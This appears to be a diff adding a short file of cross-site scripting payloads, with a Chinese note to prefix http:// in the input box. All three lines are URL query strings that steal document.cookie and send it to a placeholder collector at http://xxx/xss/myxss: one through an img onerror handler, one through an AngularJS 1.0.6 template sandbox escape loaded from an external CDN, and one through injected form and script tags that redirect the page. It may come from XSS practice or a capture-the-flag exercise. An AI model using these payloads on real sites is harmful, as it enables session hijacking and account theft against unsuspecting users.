@@ -1,0 +1,7 @@
+注意在输入框前要加http://
+
+?greet=%3Cimg/src=x%20onerror=%22a=%27http://xxx/xss/myxss?s=%27%2Bdocument.cookie;new%20Image().src=a%22%3E
+
+?guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor("document.location='http://xxx/xss/myxss?c='%2Bdocument.cookie;")()}}%3C/div%3E
+
+?name="><script>&ft_id=id"></form><Form+name%3Dname_links+id%3D"<script>document.location='http://xxx/xss/myxss?c='%2Bdocument.cookie;<%2Fscript>">
